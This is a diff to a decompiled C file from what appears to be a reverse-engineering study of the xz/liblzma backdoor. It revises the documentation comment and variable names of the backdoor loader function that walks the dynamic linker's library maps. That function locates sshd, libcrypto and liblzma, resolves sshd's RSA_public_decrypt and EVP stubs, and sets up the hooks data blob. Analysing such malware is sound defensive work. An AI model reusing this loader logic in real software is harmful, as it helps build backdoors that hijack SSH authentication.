@@ -5,15 +5,10 @@
 
 
 /*
- * AutoDoc: Traverses the `r_debug` chain looking for entries whose basename hashes to sshd, libcrypto,
- * ld.so, liblzma, libc, and libsystemd. For each match it verifies the map is sane
- * (non-overlapping, dyn pointer matches the parsed ELF) and, once all handles are collected,
- * resolves the RSA/EVP PLT stubs in sshd and primes the liblzma data segment pointer that holds
- * the hooks blob. The resulting pointers populate `backdoor_shared_libraries_data_t` for the
- * rest of the loader.
+ * AutoDoc: Walks `r_debug->r_map` and classifies each entry by basename, aborting on duplicates or malformed maps. Only after locating sshd (the main binary), libcrypto, ld-linux, libsystemd, liblzma, and libc does it parse the ELF images: sshd’s PLT is interrogated to recover `RSA_public_decrypt`, `EVP_PKEY_set1_RSA`, and `RSA_get0_key`, liblzma’s RW data segment is recorded so the `backdoor_hooks_data_t` blob and `hooks_data_addr` can be cached, libcrypto/libc descriptors are primed for later walkers, and libc’s import table is filled via `resolve_libc_imports`. The result is a fully-populated `backdoor_shared_libraries_data_t` for downstream stages.
  */
-#include "xzre_types.h"
 
+#include "xzre_types.h"
 
 BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data_t *data)
 
@@ -34,11 +29,7 @@ BOOL process_shared_libraries_map(link_map *r_map,backdoor_shared_libraries_data
   void *pvVar14;
   char *string_end;
   char *string_begin;
-  Elf64_Sym *rtld_global_sym;
-  EncodedStringId string_id;
-  backdoor_data_t *shared_data;
-  char *basename;
-  link_map *link_map_cursor;
+  u64 local_30;
   
   if (r_map == (link_map *)0x0) {
     return FALSE;
@@ -193,16 +184,15 @@ LAB_00104924:
   if ((plVar6 != (link_map *)0x0) &&
      (BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,data->elf_handles->libcrypto), BVar10 != FALSE)) {
     ppbVar8 = data->hooks_data_addr;
-    link_map_cursor = (link_map *)0x0;
+    local_30 = 0;
     peVar5 = data->elf_handles->liblzma;
     plVar6 = data->data->liblzma_map;
     if ((plVar6 != (link_map *)0x0) &&
        (((BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,peVar5), BVar10 != FALSE &&
          ((peVar5->flags & 0x20) != 0)) &&
-        (pvVar14 = elf_get_data_segment(peVar5,(u64 *)&link_map_cursor,TRUE),
-        (link_map *)0x597 < link_map_cursor)))) {
+        (pvVar14 = elf_get_data_segment(peVar5,&local_30,TRUE), 0x597 < local_30)))) {
       *ppbVar8 = (backdoor_hooks_data_t *)((long)pvVar14 + 0x10);
-      *(link_map **)((long)pvVar14 + 0x590) = link_map_cursor + -0x598;
+      *(u64 *)((long)pvVar14 + 0x590) = local_30 - 0x598;
       plVar6 = data->data->libc_map;
       if ((plVar6 != (link_map *)0x0) &&
          (BVar10 = elf_parse(*(Elf64_Ehdr **)plVar6,data->elf_handles->libc), BVar10 != FALSE)) {
